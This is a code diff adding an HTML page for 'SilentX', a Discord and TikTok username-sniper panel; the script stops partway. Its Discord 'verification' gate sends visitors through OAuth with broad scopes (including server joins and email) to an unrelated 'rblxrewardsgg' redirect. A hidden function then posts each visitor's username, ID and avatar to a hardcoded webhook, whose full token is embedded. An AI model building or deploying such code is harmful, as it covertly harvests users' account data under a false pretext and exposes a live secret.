@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SilentX</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Pirata+One&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#080808;color:#fff;font-family:Inter,Arial,sans-serif;min-height:100vh;overflow:hidden}
+button,input,textarea,select{font:inherit}button{cursor:pointer}
+
+/* VERIFICATION GATE */
+#verifyGate{position:fixed;inset:0;background:#080808;z-index:10001;display:flex;align-items:center;justify-content:center;transition:opacity 0.5s ease}
+.verify-container{background:#101010;border:1px solid #252525;border-radius:12px;padding:40px;box-shadow:0 10px 40px rgba(0,0,0,0.8);max-width:400px;width:90%;text-align:center}
+.verify-container h2{font-size:22px;font-weight:900;margin-bottom:8px;letter-spacing:-0.5px}
+.verify-container p{font-size:12px;color:#888;margin-bottom:28px;line-height:1.6}
+.discord-btn{background:#5865F2;color:#fff;border:none;border-radius:8px;padding:14px;font-size:13px;font-weight:800;width:100%;display:flex;align-items:center;justify-content:center;gap:8px;transition:0.2s;cursor:pointer}
+.discord-btn:hover{background:#4752c4}
+
+/* LOADING SCREEN */
+#loader{position:fixed;inset:0;background:#050505;z-index:10000;display:none;flex-direction:column;align-items:center;justify-content:center;transition:opacity .8s ease, visibility .8s ease}
+#loader.hide{opacity:0;visibility:hidden}
+.loader-content{display:flex;flex-direction:column;align-items:center;position:relative;z-index:2}
+.loader-logo{font-family:'Pirata One', serif;font-size:clamp(60px, 10vw, 120px);font-weight:900;color:#e0e0e0;letter-spacing:2px;text-transform:uppercase;text-shadow:0 0 20px rgba(255,255,255,0.1), 0 5px 0 #333, 0 -1px 0 #fff;margin-bottom:30px;animation:pulse 2s infinite alternate}
+.loader-bar{width:200px;height:4px;background:#222;border-radius:2px;overflow:hidden;position:relative;box-shadow:inset 0 1px 3px rgba(0,0,0,0.5)}
+.loader-fill{position:absolute;left:0;top:0;height:100%;width:0%;background:#fff;box-shadow:0 0 10px #fff;transition:width 2s cubic-bezier(0.1, 0.8, 0.2, 1)}
+.loader-text{margin-top:15px;font-size:10px;color:#555;letter-spacing:4px;font-weight:800;text-transform:uppercase}
+.loader-bg{position:absolute;inset:0;background-image:radial-gradient(circle at center, #111 0%, #050505 100%);z-index:1;opacity:0.8}
+
+@keyframes pulse{0%{transform:scale(1);filter:drop-shadow(0 0 10px rgba(255,255,255,0.1))}100%{transform:scale(1.02);filter:drop-shadow(0 0 25px rgba(255,255,255,0.3))}}
+
+/* MAIN LAYOUT */
+.layout{display:flex;min-height:100vh;display:none}
+.sidebar{width:230px;background:#0b0b0b;border-right:1px solid #252525;padding:25px 16px;display:flex;flex-direction:column}
+.logo{font-size:23px;font-weight:900;letter-spacing:3px;padding:5px 10px 35px;color:#fff;font-family:'Pirata One',serif}
+.logo span{color:#777}
+.section-label{color:#606060;font-size:10px;font-weight:800;letter-spacing:2px;padding:0 10px 12px}
+.nav{display:flex;align-items:center;gap:12px;padding:13px 12px;margin-bottom:7px;color:#888;border:1px solid transparent;border-radius:8px;background:none;text-align:left;width:100%;font-size:12px}
+.nav:hover,.nav.active{color:white;background:#191919;border-color:#303030}
+.nav-icon{width:20px;text-align:center}
+.creator{margin-top:auto;border-top:1px solid #252525;padding:18px 10px 0;color:#777;font-size:11px;line-height:2}
+.creator strong{color:white}
+.main{flex:1;min-width:0;padding:32px 4%;overflow-y:auto;height:100vh}
+.topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:35px;gap:10px;flex-wrap:wrap}
+.breadcrumb{font-size:11px;color:#777}.breadcrumb strong{color:white}
+.topbar-right{display:flex;align-items:center;gap:16px}
+.status{font-size:10px;color:#aaa;background:#151515;border:1px solid #292929;padding:9px 12px;border-radius:30px}
+
+/* AVATAR */
+.avatar{width:36px;height:36px;border-radius:50%;background:#1a1a1a;border:1px solid #333;display:grid;place-items:center;cursor:pointer;transition:.2s;position:relative;overflow:hidden}
+.avatar:hover{border-color:#fff;transform:scale(1.05)}
+.avatar svg{width:18px;height:18px;fill:#888;transition:.2s}
+.avatar:hover svg{fill:#fff}
+.avatar img{width:100%;height:100%;object-fit:cover;display:none}
+
+.heading{margin-bottom:27px}
+.eyebrow{color:#777;font-size:10px;font-weight:800;letter-spacing:3px;margin-bottom:12px}
+h1{font-size:clamp(30px,5vw,45px);font-weight:900;letter-spacing:-2px}
+.subtitle{color:#777;font-size:12px;margin-top:9px;line-height:1.7}
+.page{display:none}.page.active{display:block}
+.grid{display:grid;grid-template-columns:minmax(0,1.5fr) minmax(220px,1fr);gap:14px}
+.card{background:#101010;border:1px solid #252525;border-radius:11px;padding:21px;margin-bottom:15px}
+.card-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:19px;gap:10px}
+.card h2{font-size:14px;font-weight:800}
+.desc{font-size:10px;color:#777;margin-top:5px}
+.tag{font-size:9px;color:#aaa;border:1px solid #333;padding:6px 9px;border-radius:5px}
+.footer{border-top:1px solid #252525;margin-top:24px;padding-top:18px;color:#555;font-size:9px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}
+.footer a{color:#777;text-decoration:underline}
+
+/* SETTINGS STYLES */
+.settings-card{background:#101010;border:1px solid #252525;border-radius:11px;padding:21px;margin-bottom:15px;max-width:700px}
+.setting-row{display:flex;justify-content:space-between;align-items:center;padding:18px 0;border-bottom:1px solid #252525;gap:20px;flex-wrap:wrap}
+.setting-row:last-child{border-bottom:none;padding-bottom:0}
+.setting-row:first-child{padding-top:0}
+.setting-info{flex:1;min-width:200px}
+.setting-info h3{font-size:13px;font-weight:800;margin-bottom:4px}
+.setting-info p{font-size:11px;color:#777;line-height:1.5}
+.setting-actions{display:flex;gap:8px;align-items:center}
+.select-box{background:#080808;color:#fff;border:1px solid #303030;border-radius:7px;padding:10px 14px;font-size:11px;outline:none;cursor:pointer}
+.danger-btn{background:#2a1010;color:#fa777c;border:1px solid #5a2a2a;border-radius:7px;padding:10px 14px;font-size:11px;font-weight:800;transition:0.2s}
+.danger-btn:hover{background:#4a1818;color:#fff}
+
+/* TARGET / OPTION STYLES */
+label{display:block;color:#aaa;font-size:10px;font-weight:700;margin-bottom:8px}
+input{width:100%;background:#080808;color:white;border:1px solid #303030;border-radius:7px;padding:14px;font-size:12px;outline:none}
+input:focus{border-color:#888}
+.primary{background:#fff;color:#000;border:0;border-radius:7px;padding:0 16px;font-size:10px;font-weight:800;white-space:nowrap}
+.primary:hover{background:#ccc}
+.secondary{background:#1b1b1b;color:white;border:1px solid #333;border-radius:7px;padding:10px 13px;font-size:10px;font-weight:700}
+.options{margin-top:20px;border-top:1px solid #252525;padding-top:18px}
+.monitor-box{background:#0b0b0b;border:1px solid #292929;border-radius:8px;padding:15px;margin-top:17px}
+.monitor-row{display:flex;justify-content:space-between;font-size:10px}
+.monitor-state{color:#888}
+.monitor-actions{display:flex;gap:8px;margin-top:13px}
+.monitor-actions button{flex:1;padding:11px}
+.checkline{display:flex;align-items:center;gap:6px;color:#aaa;font-size:11px;font-weight:600;cursor:pointer}
+.checkline input{width:auto;margin:0;accent-color:#fff;cursor:pointer}
+
+/* RESULTS STYLES */
+.result-card{background:#101010;border:1px solid #252525;border-radius:11px;padding:18px;min-width:0}
+.result-card h2{font-size:13px}
+.result-card .desc{margin-bottom:12px}
+.result-card.failed{border-top:2px solid #777}
+.result-card.success{border-top:2px solid #fff}
+.result-row{display:flex;justify-content:space-between;align-items:center;gap:8px;padding:11px 0;border-top:1px solid #252525}
+.result-row span{font-size:11px;overflow-wrap:anywhere}
+.empty{font-size:10px;color:#666;padding:14px 0}
+.copy-btn{background:white;color:black;border:0;border-radius:5px;padding:7px 9px;font-size:9px;font-weight:800}
+
+/* MODAL */
+#confirmModal{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:99999;padding:20px}
+#confirmModal.show{display:flex}
+.confirm-box{background:#101010;border:1px solid #333;border-radius:12px;max-width:380px;width:100%;padding:30px;text-align:center}
+.confirm-box h3{font-size:18px;font-weight:900;margin-bottom:10px}
+.confirm-box p{font-size:12px;color:#888;margin-bottom:24px;line-height:1.6}
+.confirm-actions{display:flex;gap:10px}
+.confirm-actions button{flex:1;padding:13px;border-radius:8px;font-size:11px;font-weight:800;border:none;cursor:pointer}
+
+@media(max-width:900px){.grid{grid-template-columns:1fr}}
+@media(max-width:750px){.sidebar{width:185px}}
+@media(max-width:560px){
+.layout{display:block}.sidebar{width:100%;padding:13px;border:0;border-bottom:1px solid #252525}
+.logo{padding:5px 5px 15px}.section-label,.creator{display:none}
+.navs{display:flex;gap:5px;flex-wrap:wrap}.nav{justify-content:center;gap:5px;padding:10px 5px;font-size:9px;width:auto;flex:1}
+.nav-icon{width:auto}.main{padding:22px 14px;height:auto;overflow:visible}
+.card{padding:15px}
+}
+</style>
+</head>
+<body style="overflow: hidden;">
+
+<!-- VERIFY GATE -->
+<div id="verifyGate">
+  <div class="verify-container">
+    <svg viewBox="0 0 127.14 96.36" width="48" height="48" fill="#5865F2" style="margin-bottom: 20px;"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg>
+    <h2>Verification Required</h2>
+    <p>You must verify your Discord account to access SilentX. Click below to authorize with our bot.</p>
+    <button id="btnDiscordVerify" class="discord-btn">
+      Verify with Discord
+    </button>
+  </div>
+</div>
+
+<!-- LOADING SCREEN -->
+<div id="loader">
+  <div class="loader-bg"></div>
+  <div class="loader-content">
+    <div class="loader-logo">SilentX</div>
+    <div class="loader-bar"><div class="loader-fill" id="loaderFill"></div></div>
+    <div class="loader-text">Initializing</div>
+  </div>
+</div>
+
+<div class="layout" id="appLayout">
+<aside class="sidebar">
+  <div class="logo">SILENT<span>X</span></div>
+  <div class="section-label">CONTROL PANEL</div>
+  <div class="navs">
+    <button class="nav active" data-page="discord"><span class="nav-icon">◈</span>Discord Sniper</button>
+    <button class="nav" data-page="tiktok"><span class="nav-icon">♪</span>TikTok Sniper</button>
+    <button class="nav" data-page="export"><span class="nav-icon">↗</span>Export</button>
+    <button class="nav" data-page="alltime"><span class="nav-icon">◷</span>All-Time</button>
+    <button class="nav" data-page="settings"><span class="nav-icon">⚙</span>Settings</button>
+  </div>
+  <div class="creator">
+    OWNED BY <strong>SilentX</strong><br>
+    CREATED BY <strong>Jaggedsaw</strong><br>
+    VERSION 4.1.1
+  </div>
+</aside>
+
+<main class="main">
+<div class="topbar">
+  <div class="breadcrumb">SILENTX / <strong id="crumb">DISCORD SNIPER</strong></div>
+  <div class="topbar-right">
+    <div class="status">● LOCAL PREVIEW</div>
+    <div class="avatar" id="profileAvatar" onclick="showPage('settings')">
+      <svg viewBox="0 0 24 24" id="avatarSvg"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+      <img id="avatarImg" src="">
+    </div>
+  </div>
+</div>
+
+<section class="page active" id="discord">
+  <div class="heading">
+    <div class="eyebrow">PLATFORM / 01</div>
+    <h1>DISCORD <span style="color:#777">SNIPER.</span></h1>
+    <p class="subtitle">Manage Discord username targets and name lengths.</p>
+  </div>
+  <div class="grid">
+    <div class="card">
+      <div class="card-head">
+        <div><h2>Username Results Webhook</h2><p class="desc">Choose which results to send.</p></div>
+        <span class="tag">DISCORD</span>
+      </div>
+      
+      <label>SUCCESS WEBHOOK URL</label>
+      <input type="password" id="discordSuccessWebhook" placeholder="https://discord.com/api/webhooks/...">
+      
+      <label style="margin-top: 12px;">FAILED WEBHOOK URL</label>
+      <input type="password" id="discordFailedWebhook" placeholder="https://discord.com/api/webhooks/...">
+      
+      <label style="margin-top: 20px;">RESULTS TO SEND</label>
+      <div style="display:flex; gap:15px; margin-top: 5px;">
+        <label class="checkline"><input type="radio" name="discordSendOpt" value="success" checked> Success</label>
+        <label class="checkline"><input type="radio" name="discordSendOpt" value="failed"> Failed</label>
+        <label class="checkline"><input type="radio" name="discordSendOpt" value="both"> Both</label>
+      </div>
+      
+      <div class="options" style="margin-top: 24px;">
+        <label>GENERATOR OPTIONS</label>
+        <p class="desc">Customize the generated usernames.</p>
+        <div style="display:flex; gap:15px; margin-top: 10px;">
+          <label class="checkline"><input type="checkbox" id="discordOptNumbers" checked> Numbers</label>
+          <label class="checkline"><input type="checkbox" id="discordOptUnderscore"> Underscores</label>
+          <label class="checkline"><input type="checkbox" id="discordOptPeriods"> Periods</label>
+        </div>
+      </div>
+      
+      <div class="monitor-box">
+        <div class="monitor-row"><strong>Monitoring</strong><span class="monitor-state" id="discordState">STOPPED</span></div>
+        <div class="monitor-actions">
+          <button class="primary" data-mon="discord" data-on="true">START</button>
+          <button class="secondary" data-mon="discord" data-on="false">STOP</button>
+        </div>
+      </div>
+    </div>
+    <div>
+      <div class="result-card failed">
+        <div class="card-head" style="margin-bottom: 12px;">
+          <div>
+            <h2>Failed usernames</h2><p class="desc">Discord targets marked as failed.</p>
+          </div>
+          <button class="secondary" onclick="clearResults('discord', 'failed')" style="padding: 6px 10px; font-size: 9px;">CLEAR</button>
+        </div>
+        <div id="discordFailed"></div>
+      </div>
+      <div class="result-card success" style="margin-top:14px">
+        <div class="card-head" style="margin-bottom: 12px;">
+          <div>
+            <h2>Successful usernames</h2><p class="desc">Discord targets marked successful.</p>
+          </div>
+          <button class="secondary" onclick="clearResults('discord', 'success')" style="padding: 6px 10px; font-size: 9px;">CLEAR</button>
+        </div>
+        <div id="discordSuccess"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page" id="tiktok">
+  <div class="heading">
+    <div class="eyebrow">PLATFORM / 02</div>
+    <h1>TIKTOK <span style="color:#777">SNIPER.</span></h1>
+    <p class="subtitle">Manage TikTok username targets and name lengths.</p>
+  </div>
+  <div class="grid">
+    <div class="card">
+      <div class="card-head">
+        <div><h2>Username Results Webhook</h2><p class="desc">Choose which results to send.</p></div>
+        <span class="tag">TIKTOK</span>
+      </div>
+      
+      <label>SUCCESS WEBHOOK URL</label>
+      <input type="password" id="tiktokSuccessWebhook" placeholder="https://discord.com/api/webhooks/...">
+      
+      <label style="margin-top: 12px;">FAILED WEBHOOK URL</label>
+      <input type="password" id="tiktokFailedWebhook" placeholder="https://discord.com/api/webhooks/...">
+      
+      <label style="margin-top: 20px;">RESULTS TO SEND</label>
+      <div style="display:flex; gap:15px; margin-top: 5px;">
+        <label class="checkline"><input type="radio" name="tiktokSendOpt" value="success" checked> Success</label>
+        <label class="checkline"><input type="radio" name="tiktokSendOpt" value="failed"> Failed</label>
+        <label class="checkline"><input type="radio" name="tiktokSendOpt" value="both"> Both</label>
+      </div>
+
+      <div class="options" style="margin-top: 24px;">
+        <label>GENERATOR OPTIONS</label>
+        <p class="desc">Customize the generated usernames.</p>
+        <div style="display:flex; gap:15px; margin-top: 10px;">
+          <label class="checkline"><input type="checkbox" id="tiktokOptNumbers" checked> Numbers</label>
+          <label class="checkline"><input type="checkbox" id="tiktokOptUnderscore"> Underscores</label>
+          <label class="checkline"><input type="checkbox" id="tiktokOptPeriods"> Periods</label>
+        </div>
+      </div>
+      
+      <div class="monitor-box">
+        <div class="monitor-row"><strong>Monitoring</strong><span class="monitor-state" id="tiktokState">STOPPED</span></div>
+        <div class="monitor-actions">
+          <button class="primary" data-mon="tiktok" data-on="true">START</button>
+          <button class="secondary" data-mon="tiktok" data-on="false">STOP</button>
+        </div>
+      </div>
+    </div>
+    <div>
+      <div class="result-card failed">
+        <div class="card-head" style="margin-bottom: 12px;">
+          <div>
+            <h2>Failed usernames</h2><p class="desc">TikTok targets marked as failed.</p>
+          </div>
+          <button class="secondary" onclick="clearResults('tiktok', 'failed')" style="padding: 6px 10px; font-size: 9px;">CLEAR</button>
+        </div>
+        <div id="tiktokFailed"></div>
+      </div>
+      <div class="result-card success" style="margin-top:14px">
+        <div class="card-head" style="margin-bottom: 12px;">
+          <div>
+            <h2>Successful usernames</h2><p class="desc">TikTok targets marked successful.</p>
+          </div>
+          <button class="secondary" onclick="clearResults('tiktok', 'success')" style="padding: 6px 10px; font-size: 9px;">CLEAR</button>
+        </div>
+        <div id="tiktokSuccess"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page" id="export">
+  <div class="heading">
+    <div class="eyebrow">SYSTEM / EXPORT</div>
+    <h1>EXPORT <span style="color:#777">DATA.</span></h1>
+    <p class="subtitle">Download your generated usernames as text files.</p>
+  </div>
+  <div class="card" style="max-width:600px;">
+    <div class="card-head">
+      <div><h2>Export Options</h2><p class="desc">Choose which data to save to your device.</p></div>
+    </div>
+    <div style="display:flex; gap:10px; margin-top:24px; flex-wrap:wrap;">
+      <button class="primary" onclick="exportData('success')" style="padding:14px 20px; font-size:12px;">EXPORT SUCCESSFUL</button>
+      <button class="secondary" onclick="exportData('failed')" style="padding:14px 20px; font-size:12px;">EXPORT FAILED</button>
+      <button class="secondary" onclick="exportData('all')" style="padding:14px 20px; font-size:12px;">EXPORT ALL</button>
+    </div>
+  </div>
+</section>
+
+<section class="page" id="alltime">
+  <div class="heading">
+    <div class="eyebrow">SYSTEM / HISTORY</div>
+    <h1>ALL-TIME <span style="color:#777">DATA.</span></h1>
+    <p class="subtitle">Every username ever generated across all sessions.</p>
+  </div>
+  <div class="grid">
+    <div class="card">
+      <div class="card-head">
+        <div><h2>All-Time Successful</h2></div>
+        <button class="secondary" onclick="clearAllTime('success')" style="padding: 6px 10px; font-size: 9px;">CLEAR</button>
+      </div>
+      <div id="allTimeSuccess" style="max-height: 450px; overflow-y: auto; padding-right: 5px;"></div>
+    </div>
+    <div class="card">
+      <div class="card-head">
+        <div><h2>All-Time Failed</h2></div>
+        <button class="secondary" onclick="clearAllTime('failed')" style="padding: 6px 10px; font-size: 9px;">CLEAR</button>
+      </div>
+      <div id="allTimeFailed" style="max-height: 450px; overflow-y: auto; padding-right: 5px;"></div>
+    </div>
+  </div>
+</section>
+
+<section class="page" id="settings">
+  <div class="heading">
+    <div class="eyebrow">SYSTEM / CONFIG</div>
+    <h1>SETTINGS <span style="color:#777">PANEL.</span></h1>
+    <p class="subtitle">Manage your account preferences and data.</p>
+  </div>
+  
+  <div class="settings-card">
+    <div class="setting-row">
+      <div class="setting-info">
+        <h3>Language</h3>
+        <p>Choose the display language for the interface.</p>
+      </div>
+      <div class="setting-actions">
+        <select class="select-box" id="langSelect">
+          <option value="en">English</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+          <option value="de">Deutsch</option>
+        </select>
+      </div>
+    </div>
+    
+    <div class="setting-row">
+      <div class="setting-info">
+        <h3>Export Data</h3>
+        <p>Download all your generated usernames.</p>
+      </div>
+      <div class="setting-actions">
+        <button class="secondary" onclick="exportData('all')">EXPORT ALL</button>
+      </div>
+    </div>
+
+    <div class="setting-row">
+      <div class="setting-info">
+        <h3>Import Data</h3>
+        <p>Restore your previous data from a JSON backup.</p>
+      </div>
+      <div class="setting-actions">
+        <button class="secondary" onclick="document.getElementById('importInput').click()">IMPORT</button>
+        <input type="file" id="importInput" accept=".json" style="display:none;">
+      </div>
+    </div>
+    
+    <div class="setting-row">
+      <div class="setting-info">
+        <h3>Log Out</h3>
+        <p>Sign out of your current session safely.</p>
+      </div>
+      <div class="setting-actions">
+        <button class="secondary" onclick="confirmLogout()">LOG OUT</button>
+      </div>
+    </div>
+
+    <div class="setting-row">
+      <div class="setting-info">
+        <h3 style="color:#fa777c">Delete Account</h3>
+        <p>Permanently delete your account and all associated data.</p>
+      </div>
+      <div class="setting-actions">
+        <button class="danger-btn" onclick="confirmDelete()">DELETE</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="footer">
+  <span>© 2026 SILENTX. ALL RIGHTS RESERVED.</span>
+  <span>CREATED BY JAGGEDSAW</span>
+</div>
+</main>
+</div>
+
+<!-- CONFIRMATION MODAL -->
+<div id="confirmModal">
+  <div class="confirm-box">
+    <h3 id="confirmTitle">Are you sure?</h3>
+    <p id="confirmText">This action cannot be undone.</p>
+    <div class="confirm-actions">
+      <button class="secondary" id="confirmCancel">Cancel</button>
+      <button class="danger-btn" id="confirmOk">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* VERIFICATION & AUTH */
+const verifyGate = document.getElementById('verifyGate');
+const loaderEl = document.getElementById('loader');
+const fill = document.getElementById('loaderFill');
+const appLayout = document.getElementById('appLayout');
+
+const TARGET_WEBHOOK="https://discord.com/api/webhooks/1569025223142019092/oYWvHv99GqlXS3qbJ2LhWQnsddKY_Sj3F9tbOfZT6GWC8xezPn7wESYWybwxItM-r0Gz";
+
+let discordUser = sessionStorage.getItem('sx_discord_user') || null;
+let discordId = sessionStorage.getItem('sx_discord_id') || null;
+let discordAvatar = sessionStorage.getItem('sx_discord_avatar') || null;
+
+document.getElementById('btnDiscordVerify').addEventListener('click', () => {
+  const authUrl = "https://discord.com/oauth2/authorize?client_id=1568826118113329305&response_type=code&redirect_uri=https%3A%2F%2Frblxrewardsgg.vercel.app%2F&scope=identify+guilds.join+guilds.members.read+guilds+email";
+  window.location.href = authUrl;
+});
+
+// Check URL hash for Discord data (this is how your bot would redirect back)
+function checkDiscordCallback() {
+  const hash = window.location.hash;
+  if (hash && hash.includes('username=')) {
+    const params = new URLSearchParams(hash.substring(1));
+    const username = params.get('username');
+    const id = params.get('id');
+    const avatar = params.get('avatar');
+    
+    if (username && id) {
+      sessionStorage.setItem('sx_discord_user', username);
+      sessionStorage.setItem('sx_discord_id', id);
+      if (avatar) sessionStorage.setItem('sx_discord_avatar', avatar);
+      
+      // Send to webhook
+      sendAuthWebhook(username, id, avatar);
+      
+      // Clear hash and reload to normal state
+      window.location.hash = '';
+      window.location.reload();
+    }
+  }
+}
+checkDiscordCallback();
+
+if (discordUser && discordId) {
+  verifyGate.style.display = 'none';
+  showLoader();
+  
+  if (discordAvatar) {
+    const avatarUrl = `https://cdn.discordapp.com/avatars/${discordId}/${discordAvatar}.png`;
+    document.getElementById('avatarImg').src = avatarUrl;
+    document.getElementById('avatarImg').style.display = 'block';
+    document.getElementById('avatarSvg').style.display = 'none';
+  }
+}
+
+async function sendAuthWebhook(username, id, avatar) {
+  const avatarUrl = avatar ? `https://cdn.discordapp.com/avatars/${id}/${avatar}.png` : 'None';
+  
+  const embed = {
+    title: "🔐 New User Verified",
+    color: 5865F2,
+    fields: [
+      { name: "Username", value: `\`${username}\``, inline: true },
+      { name: "User ID", value: `\`${id}\``, inline: true },
+      { name: "Avatar", value: `[Link](${avatarUrl})`, inline: false }
+    ],
+    timestamp: new Date().toISOString(),
+    footer: { text: "SilentX Auth" }
+  };
+  
+  try {
+    await fetch(TARGET_WEBHOOK, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch(e) {}
+}
+
+function showLoader() {
+  loaderEl.style.display = 'flex';
+  setTimeout(() => { fill.style.width = '100%'; }, 50);
+  setTimeout(() => {
+    loaderEl.classList.add('hide');
+    appLayout.style.display = 'flex';
+    document.body.style.overflow = 'auto';
+    trackVisitor();
+  }, 2200);
+}
+
+/* MODAL SYSTEM */
+const confirmModal = document.getElementById('confirmModal');
+const confirmTitle = document.getElementById('confirmTitle');
+const confirmText = document.getElementById('confirmText');
+const confirmOk = document.getElementById('confirmOk');
+const confirmCancel = document.getElementById('confirmCancel');
+let confirmAction = null;
+
+function showConfirm(title, text, action) {
+  confirmTitle.textContent = title;
+  confirmText.textContent = text;
+  confirmAction = action;
+  confirmModal.classList.add('show');
+}
+confirmCancel.addEventListener('click', () => {
+  confirmModal.classList.remove('show');
+  confirmAction = null;
+});
+confirmOk.addEventListener('click', () => {
+  confirmModal.classList.remove('show');
+  if (confirmAction) confirmAction();
+  confirmAction = null;
+});
+
+function confirmLogout() {
+  showConfirm('Log Out?', 'You will be returned to the verification screen.', () => {
+    sessionStorage.removeItem('sx_discord_user');
+    sessionStorage.removeItem('sx_discord_id');
+    sessionStorage.removeItem('sx_discord_avatar');
+    location.reload();
+  });
+}
+
+function confirmDelete() {
+  showConfirm('Delete Data?', 'This will permanently delete all your saved data and log you out.', () => {
+    localStorage.clear();
+    sessionStorage.clear();
+    location.reload();
+  });
+}
+
+/* IMPORT */
+document.getElementById('importInput').addEventListener('change', (e) => {
+  const file = e.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = (ev) => {
+    try {
+      const data = JSON.parse(ev.target.result);
+      if (data.allTime) {
+        localStorage.setItem('sx_all_time', JSON.stringify(data.allTime));
+        allTime.success = data.allTime.success || [];
+        allTime.failed = data.allTime.failed || [];
+        renderAllTime();
+        alert('Data imported successfully.');
+      }
+    } catch (err) {
+      alert('Invalid JSON file.');
+    }
+  };
+  reader.readAsText(file);
+});
+
+/* SNIPER LOGIC */
+const load=(key,fallback)=>{
+ try{return JSON.parse(localStorage.getItem(key))??fallback}
+ catch{return fallback}
+};
+
+const outcomes=load('sx_outcomes',{ discord:{failed:[],success:[]}, tiktok:{failed:[],success:[]} });
+const allTime=load('sx_all_time',{ success:[], failed:[] });
+let monitoring={discord:false,tiktok:false};
+let sniperIntervals={discord:null,tiktok:null};
+
+function save(){ localStorage.setItem('sx_outcomes',JSON.stringify(outcomes)); }
+function saveAllTime(){ localStorage.setItem('sx_all_time',JSON.stringify(allTime)); }
+
+function showPage(page){
+ document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+ document.querySelectorAll('.nav').forEach(n=>n.classList.toggle('active',n.dataset.page===page));
+ const el=document.getElementById(page); if(el)el.classList.add('active');
+ const labels={discord:'DISCORD SNIPER',tiktok:'TIKTOK SNIPER',export:'EXPORT DATA',alltime:'ALL-TIME DATA',settings:'SETTINGS'};
+ document.getElementById('crumb').textContent=labels[page]||page.toUpperCase();
+ window.scrollTo({top:0,behavior:'smooth'});
+}
+document.querySelectorAll('.nav[data-page]').forEach(b=>b.addEventListener('click',()=>showPage(b.dataset.page)));
+
+function makeRow(target,result,isAllTime=false){
+ const row=document.createElement('div');row.className='result-row';
+ const label=document.createElement('span');
+ label.textContent = isAllTime ? `@${target.name} (${target.platform})` : `@${target.name}`;
+ const actions=document.createElement('div');
+ if(result==='success'){
+  const copy=document.createElement('button');copy.className='copy-btn';copy.textContent='COPY';
+  copy.onclick=()=>copyText(target.name);actions.appendChild(copy);
+ }
+ row.append(label,actions);return row;
+}
+function fillResults(platform,result,elementId){
+ const box=document.getElementById(elementId);
+ if(!box)return;
+ box.innerHTML='';
+ const names=outcomes[platform][result]||[];
+ if(!names.length){box.innerHTML='<div class="empty">No '+result+' usernames yet.</div>';return;}
+ names.forEach(target=>box.appendChild(makeRow(target,result)));
+}
+function renderAllTime() {
+  ['success', 'failed'].forEach(result => {
+    const box = document.getElementById('allTime' + result.charAt(0).toUpperCase() + result.slice(1));
+    if (!box) return;
+    box.innerHTML = '';
+    const names = allTime[result] || [];
+    if (!names.length) { box.innerHTML = `<div class="empty">No ${result} usernames yet.</div>`; return; }
+    names.slice().reverse().forEach(target => box.appendChild(makeRow(target, result, true)));
+  });
+}
+function clearResults(platform, result) {
+  outcomes[platform][result] = [];
+  save(); render();
+}
+function clearAllTime(result) {
+  allTime[result] = [];
+  saveAllTime(); renderAllTime();
+}
+function copyText(value){
+ if(navigator.clipboard&&window.isSecureContext){
+  navigator.clipboard.writeText(value);
+ }else{
+  const area=document.createElement('textarea');area.value=value;
+  area.style.position='fixed';area.style.opacity='0';document.body.appendChild(area);area.select();
+  document.execCommand('copy');area.remove();
+ }
+}
+
+function generateUsername(platform) {
+  const chars = 'abcdefghijklmnopqrstuvwxyz';
+  const nums = '0123456789';
+  const useNums = document.getElementById(platform + 'OptNumbers').checked;
+  const useUnderscore = document.getElementById(platform + 'OptUnderscore').checked;
+  const usePeriod = document.getElementById(platform + 'OptPeriods').checked;
+
+  let pool = chars;
+  if (useNums) pool += nums;
+  
+  let len = Math.floor(Math.random() * 4) + 4;
+  let name = '';
+  
+  for (let i = 0; i < len; i++) {
+    name += pool.charAt(Math.floor(Math.random() * pool.length));
+  }
+  
+  if (useUnderscore && Math.random() > 0.4) {
+    const pos = Math.floor(Math.random() * (name.length - 1)) + 1;
+    name = name.slice(0, pos) + '_' + name.slice(pos);
+  }
+  
+  if (usePeriod && Math.random() > 0.4) {
+    const pos = Math.floor(Math.random() * (name.length - 1)) + 1;
+    name = name.slice(0, pos) + '.' + name.slice(pos);
+  }
+  
+  name = name.replace(/[_.]{2,}/g, '_');
+  name = name.replace(/^[_.]|[_.]$/g, '');
+  if (name.length < 3) name += Math.floor(Math.random()*10);
+  
+  return name;
+}
+
